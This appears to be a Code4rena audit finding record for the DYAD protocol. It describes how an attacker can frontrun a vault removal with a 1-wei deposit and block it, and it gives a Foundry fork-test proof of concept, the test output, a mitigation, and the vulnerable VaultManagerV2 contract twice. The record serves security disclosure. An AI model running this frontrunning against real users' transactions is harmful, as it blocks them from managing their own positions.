{
  "Title": "[M-06] Attacker can frontrun to prevent vaults from being removed from the dNFT owner's position",
  "Content": "\nWhen removing a vault from a dNFT position, the vault must have no assets for that dNFT.\n\n```solidity\n  function remove(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0) revert VaultHasAssets();\n    ...\n  }\n```\n\n<https://github.com/code-423n4/2024-04-dyad/blob/main/src/core/VaultManagerV2.sol#L94-L104>\n\n```solidity\n  function removeKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0)     revert VaultHasAssets();\n  }\n```\n\n<https://github.com/code-423n4/2024-04-dyad/blob/main/src/core/VaultManagerV2.sol#L106-L116>\n\nHowever, since anyone can deposit into a dNFT, anyone can prevent a vault from being removed from a dNFT position by observing the call to `remove()` in the mempool, and frontrunning the transaction by depositing dust amounts to the dNFT.\n\n### Impact\n\nAnyone can stop a vault from being removed from a dNFT position, at almost no cost.\n\nIf the victim has reached the max vault limit, they must remove a vault before adding a new one to their dNFT position. Therefore, this vulnerability may force them to mint a new dNFT to use new vaults.\n\n### Proof of Concept\n\nAdd [this file](https://gist.github.com/TheSavageTeddy/8dd94d8bb6a50459c5900e3b346afca5) to `test/fork/`.`\n\nRun the test with `forge test --rpc-url https://eth-mainnet.g.alchemy.com/v2/<YOUR_KEY> --match-test \"testDosRemoveVault\" --fork-block-number 19693723 -vvv`\n\nThe PoC demonstrates Alice attempting to remove a vault from her dNFT position. She can do so as there are no assets in her position, but Bob stops her by frontrunning her call to `remove()`, depositing 1 wei of ether into her dNFT.\n\nA snippet of the PoC is shown below:\n\n```solidity\n  function testDosRemoveVault() public {\n    // create DNFT for alice\n    DNft dNft = DNft(MAINNET_DNFT);\n    vm.deal(alice, 10 ether);\n    vm.startPrank(alice);\n    uint id = dNft.mintNft{value: 1 ether}(alice);\n    // alice adds wstETH vault to her dNFT position\n    contracts.vaultManager.add(id, address(contracts.wstEth));\n    vm.stopPrank();\n\n    vm.prank(contracts.vaultLicenser.owner());\n    contracts.vaultLicenser.add(address(contracts.wstEth));\n\n    // faucet some WSTETH\n    uint AMOUNT = 10000e18;\n    vm.prank(address(0x0B925eD163218f6662a35e0f0371Ac234f9E9371));\n    IERC20Minimal(MAINNET_WSTETH).transfer(address(this), AMOUNT); \n    // give bob some wsteth\n    IERC20Minimal(MAINNET_WSTETH).transfer(bob, 1e18);\n\n    // alice has no assets in her position, so she can remove her dNFT\n    console.log(\"alice dNFT position wstETH assets:\", contracts.wstEth.id2asset(id));\n    // alice wants to remove the wstETH vault from her dNFT position\n    // however, bob wants to stop her from doing so.\n    // so he frontruns her call to `remove()` by depositing 1 asset into her dNFT\n    vm.startPrank(bob);\n    IERC20Minimal(MAINNET_WSTETH).approve(address(contracts.vaultManager), type(uint).max);\n    contracts.vaultManager.deposit(id, address(contracts.wstEth), 1);\n    vm.stopPrank();\n\n    // now alice's transaction to `remove()` will revert due to having assets\n    vm.prank(alice);\n    vm.expectRevert(VaultHasAssets.selector);\n    contracts.vaultManager.remove(id, address(contracts.wstEth));\n\n    console.log(\"alice dNFT position wstETH assets:\", contracts.wstEth.id2asset(id));\n  }\n```\n\nOutput:\n\n    Logs:\n      alice dNFT position wstETH assets: 0\n      alice dNFT position wstETH assets: 1\n\n### Recommended Mitigation Steps\n\nAllow dNFT owners to remove vaults from their dNFT positions even if it has assets, but have a clear warning that doing so may reduce their collateral and cause liquidation.\n\n**[shafu0x (DYAD) confirmed](https://github.com/code-423n4/2024-04-dyad-findings/issues/118#event-13192019192)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-04-dyad",
  "Code": [
    {
      "filename": "src/core/VaultManagerV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.17;\n\nimport {DNft}            from \"./DNft.sol\";\nimport {Dyad}            from \"./Dyad.sol\";\nimport {Licenser}        from \"./Licenser.sol\";\nimport {Vault}           from \"./Vault.sol\";\nimport {IVaultManager}   from \"../interfaces/IVaultManager.sol\";\nimport {KerosineManager} from \"../../src/core/KerosineManager.sol\";\n\nimport {FixedPointMathLib} from \"@solmate/src/utils/FixedPointMathLib.sol\";\nimport {ERC20}             from \"@solmate/src/tokens/ERC20.sol\";\nimport {SafeTransferLib}   from \"@solmate/src/utils/SafeTransferLib.sol\";\nimport {EnumerableSet}     from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport {Initializable}     from \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\ncontract VaultManagerV2 is IVaultManager, Initializable {\n  using EnumerableSet     for EnumerableSet.AddressSet;\n  using FixedPointMathLib for uint;\n  using SafeTransferLib   for ERC20;\n\n  uint public constant MAX_VAULTS          = 5;\n  uint public constant MAX_VAULTS_KEROSENE = 5;\n\n  uint public constant MIN_COLLATERIZATION_RATIO = 1.5e18; // 150%\n  uint public constant LIQUIDATION_REWARD        = 0.2e18; //  20%\n\n  DNft     public immutable dNft;\n  Dyad     public immutable dyad;\n  Licenser public immutable vaultLicenser;\n\n  KerosineManager public keroseneManager;\n\n  mapping (uint => EnumerableSet.AddressSet) internal vaults; \n  mapping (uint => EnumerableSet.AddressSet) internal vaultsKerosene; \n\n  mapping (uint => uint) public idToBlockOfLastDeposit;\n\n  modifier isDNftOwner(uint id) {\n    if (dNft.ownerOf(id) != msg.sender)   revert NotOwner();    _;\n  }\n  modifier isValidDNft(uint id) {\n    if (dNft.ownerOf(id) == address(0))   revert InvalidDNft(); _;\n  }\n  modifier isLicensed(address vault) {\n    if (!vaultLicenser.isLicensed(vault)) revert NotLicensed(); _;\n  }\n\n  constructor(\n    DNft          _dNft,\n    Dyad          _dyad,\n    Licenser      _licenser\n  ) {\n    dNft          = _dNft;\n    dyad          = _dyad;\n    vaultLicenser = _licenser;\n  }\n\n  function setKeroseneManager(KerosineManager _keroseneManager) \n    external\n      initializer \n    {\n      keroseneManager = _keroseneManager;\n  }\n\n  /// @inheritdoc IVaultManager\n  function add(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaults[id].length() >= MAX_VAULTS) revert TooManyVaults();\n    if (!vaultLicenser.isLicensed(vault))  revert VaultNotLicensed();\n    if (!vaults[id].add(vault))            revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  function addKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaultsKerosene[id].length() >= MAX_VAULTS_KEROSENE) revert TooManyVaults();\n    if (!keroseneManager.isLicensed(vault))                 revert VaultNotLicensed();\n    if (!vaultsKerosene[id].add(vault))                     revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function remove(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0) revert VaultHasAssets();\n    if (!vaults[id].remove(vault))     revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  function removeKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0)     revert VaultHasAssets();\n    if (!vaultsKerosene[id].remove(vault)) revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function deposit(\n    uint    id,\n    address vault,\n    uint    amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    idToBlockOfLastDeposit[id] = block.number;\n    Vault _vault = Vault(vault);\n    _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);\n    _vault.deposit(id, amount);\n  }\n\n  /// @inheritdoc IVaultManager\n  function withdraw(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  ) \n    public\n      isDNftOwner(id)\n  {\n    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();\n    uint dyadMinted = dyad.mintedDyad(address(this), id);\n    Vault _vault = Vault(vault);\n    uint value = amount * _vault.assetPrice() \n                  * 1e18 \n                  / 10**_vault.oracle().decimals() \n                  / 10**_vault.asset().decimals();\n    if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat();\n    _vault.withdraw(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); \n  }\n\n  /// @inheritdoc IVaultManager\n  function mintDyad(\n    uint    id,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n  {\n    uint newDyadMinted = dyad.mintedDyad(address(this), id) + amount;\n    if (getNonKeroseneValue(id) < newDyadMinted)     revert NotEnoughExoCollat();\n    dyad.mint(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO) revert CrTooLow(); \n    emit MintDyad(id, amount, to);\n  }\n\n  /// @inheritdoc IVaultManager\n  function burnDyad(\n    uint id,\n    uint amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    dyad.burn(id, msg.sender, amount);\n    emit BurnDyad(id, amount, msg.sender);\n  }\n\n  /// @inheritdoc IVaultManager\n  function redeemDyad(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n    returns (uint) { \n      dyad.burn(id, msg.sender, amount);\n      Vault _vault = Vault(vault);\n      uint asset = amount \n                    * (10**(_vault.oracle().decimals() + _vault.asset().decimals())) \n                    / _vault.assetPrice() \n                    / 1e18;\n      withdraw(id, vault, asset, to);\n      emit RedeemDyad(id, vault, amount, to);\n      return asset;\n  }\n\n  /// @inheritdoc IVaultManager\n  function liquidate(\n    uint id,\n    uint to\n  ) \n    external \n      isValidDNft(id)\n      isValidDNft(to)\n    {\n      uint cr = collatRatio(id);\n      if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();\n      dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id));\n\n      uint cappedCr               = cr < 1e18 ? 1e18 : cr;\n      uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);\n      uint liquidationAssetShare  = (liquidationEquityShare + 1e18).divWadDown(cappedCr);\n\n      uint numberOfVaults = vaults[id].length();\n      for (uint i = 0; i < numberOfVaults; i++) {\n          Vault vault      = Vault(vaults[id].at(i));\n          uint  collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);\n          vault.move(id, to, collateral);\n      }\n      emit Liquidate(id, msg.sender, to);\n  }\n\n  function collatRatio(\n    uint id\n  )\n    public \n    view\n    returns (uint) {\n      uint _dyad = dyad.mintedDyad(address(this), id);\n      if (_dyad == 0) return type(uint).max;\n      return getTotalUsdValue(id).divWadDown(_dyad);\n  }\n\n  function getTotalUsdValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      return getNonKeroseneValue(id) + getKeroseneValue(id);\n  }\n\n  function getNonKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaults[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaults[id].at(i));\n        uint usdValue;\n        if (vaultLicenser.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  function getKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaultsKerosene[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaultsKerosene[id].at(i));\n        uint usdValue;\n        if (keroseneManager.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  // ----------------- MISC ----------------- //\n\n  function getVaults(\n    uint id\n  ) \n    external \n    view \n    returns (address[] memory) {\n      return vaults[id].values();\n  }\n\n  function hasVault(\n    uint    id,\n    address vault\n  ) \n    external \n    view \n    returns (bool) {\n      return vaults[id].contains(vault);\n  }\n}"
    },
    {
      "filename": "src/core/VaultManagerV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.17;\n\nimport {DNft}            from \"./DNft.sol\";\nimport {Dyad}            from \"./Dyad.sol\";\nimport {Licenser}        from \"./Licenser.sol\";\nimport {Vault}           from \"./Vault.sol\";\nimport {IVaultManager}   from \"../interfaces/IVaultManager.sol\";\nimport {KerosineManager} from \"../../src/core/KerosineManager.sol\";\n\nimport {FixedPointMathLib} from \"@solmate/src/utils/FixedPointMathLib.sol\";\nimport {ERC20}             from \"@solmate/src/tokens/ERC20.sol\";\nimport {SafeTransferLib}   from \"@solmate/src/utils/SafeTransferLib.sol\";\nimport {EnumerableSet}     from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport {Initializable}     from \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\ncontract VaultManagerV2 is IVaultManager, Initializable {\n  using EnumerableSet     for EnumerableSet.AddressSet;\n  using FixedPointMathLib for uint;\n  using SafeTransferLib   for ERC20;\n\n  uint public constant MAX_VAULTS          = 5;\n  uint public constant MAX_VAULTS_KEROSENE = 5;\n\n  uint public constant MIN_COLLATERIZATION_RATIO = 1.5e18; // 150%\n  uint public constant LIQUIDATION_REWARD        = 0.2e18; //  20%\n\n  DNft     public immutable dNft;\n  Dyad     public immutable dyad;\n  Licenser public immutable vaultLicenser;\n\n  KerosineManager public keroseneManager;\n\n  mapping (uint => EnumerableSet.AddressSet) internal vaults; \n  mapping (uint => EnumerableSet.AddressSet) internal vaultsKerosene; \n\n  mapping (uint => uint) public idToBlockOfLastDeposit;\n\n  modifier isDNftOwner(uint id) {\n    if (dNft.ownerOf(id) != msg.sender)   revert NotOwner();    _;\n  }\n  modifier isValidDNft(uint id) {\n    if (dNft.ownerOf(id) == address(0))   revert InvalidDNft(); _;\n  }\n  modifier isLicensed(address vault) {\n    if (!vaultLicenser.isLicensed(vault)) revert NotLicensed(); _;\n  }\n\n  constructor(\n    DNft          _dNft,\n    Dyad          _dyad,\n    Licenser      _licenser\n  ) {\n    dNft          = _dNft;\n    dyad          = _dyad;\n    vaultLicenser = _licenser;\n  }\n\n  function setKeroseneManager(KerosineManager _keroseneManager) \n    external\n      initializer \n    {\n      keroseneManager = _keroseneManager;\n  }\n\n  /// @inheritdoc IVaultManager\n  function add(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaults[id].length() >= MAX_VAULTS) revert TooManyVaults();\n    if (!vaultLicenser.isLicensed(vault))  revert VaultNotLicensed();\n    if (!vaults[id].add(vault))            revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  function addKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaultsKerosene[id].length() >= MAX_VAULTS_KEROSENE) revert TooManyVaults();\n    if (!keroseneManager.isLicensed(vault))                 revert VaultNotLicensed();\n    if (!vaultsKerosene[id].add(vault))                     revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function remove(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0) revert VaultHasAssets();\n    if (!vaults[id].remove(vault))     revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  function removeKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0)     revert VaultHasAssets();\n    if (!vaultsKerosene[id].remove(vault)) revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function deposit(\n    uint    id,\n    address vault,\n    uint    amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    idToBlockOfLastDeposit[id] = block.number;\n    Vault _vault = Vault(vault);\n    _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);\n    _vault.deposit(id, amount);\n  }\n\n  /// @inheritdoc IVaultManager\n  function withdraw(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  ) \n    public\n      isDNftOwner(id)\n  {\n    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();\n    uint dyadMinted = dyad.mintedDyad(address(this), id);\n    Vault _vault = Vault(vault);\n    uint value = amount * _vault.assetPrice() \n                  * 1e18 \n                  / 10**_vault.oracle().decimals() \n                  / 10**_vault.asset().decimals();\n    if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat();\n    _vault.withdraw(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); \n  }\n\n  /// @inheritdoc IVaultManager\n  function mintDyad(\n    uint    id,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n  {\n    uint newDyadMinted = dyad.mintedDyad(address(this), id) + amount;\n    if (getNonKeroseneValue(id) < newDyadMinted)     revert NotEnoughExoCollat();\n    dyad.mint(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO) revert CrTooLow(); \n    emit MintDyad(id, amount, to);\n  }\n\n  /// @inheritdoc IVaultManager\n  function burnDyad(\n    uint id,\n    uint amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    dyad.burn(id, msg.sender, amount);\n    emit BurnDyad(id, amount, msg.sender);\n  }\n\n  /// @inheritdoc IVaultManager\n  function redeemDyad(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n    returns (uint) { \n      dyad.burn(id, msg.sender, amount);\n      Vault _vault = Vault(vault);\n      uint asset = amount \n                    * (10**(_vault.oracle().decimals() + _vault.asset().decimals())) \n                    / _vault.assetPrice() \n                    / 1e18;\n      withdraw(id, vault, asset, to);\n      emit RedeemDyad(id, vault, amount, to);\n      return asset;\n  }\n\n  /// @inheritdoc IVaultManager\n  function liquidate(\n    uint id,\n    uint to\n  ) \n    external \n      isValidDNft(id)\n      isValidDNft(to)\n    {\n      uint cr = collatRatio(id);\n      if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();\n      dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id));\n\n      uint cappedCr               = cr < 1e18 ? 1e18 : cr;\n      uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);\n      uint liquidationAssetShare  = (liquidationEquityShare + 1e18).divWadDown(cappedCr);\n\n      uint numberOfVaults = vaults[id].length();\n      for (uint i = 0; i < numberOfVaults; i++) {\n          Vault vault      = Vault(vaults[id].at(i));\n          uint  collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);\n          vault.move(id, to, collateral);\n      }\n      emit Liquidate(id, msg.sender, to);\n  }\n\n  function collatRatio(\n    uint id\n  )\n    public \n    view\n    returns (uint) {\n      uint _dyad = dyad.mintedDyad(address(this), id);\n      if (_dyad == 0) return type(uint).max;\n      return getTotalUsdValue(id).divWadDown(_dyad);\n  }\n\n  function getTotalUsdValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      return getNonKeroseneValue(id) + getKeroseneValue(id);\n  }\n\n  function getNonKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaults[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaults[id].at(i));\n        uint usdValue;\n        if (vaultLicenser.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  function getKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaultsKerosene[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaultsKerosene[id].at(i));\n        uint usdValue;\n        if (keroseneManager.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  // ----------------- MISC ----------------- //\n\n  function getVaults(\n    uint id\n  ) \n    external \n    view \n    returns (address[] memory) {\n      return vaults[id].values();\n  }\n\n  function hasVault(\n    uint    id,\n    address vault\n  ) \n    external \n    view \n    returns (bool) {\n      return vaults[id].contains(vault);\n  }\n}"
    }
  ]
}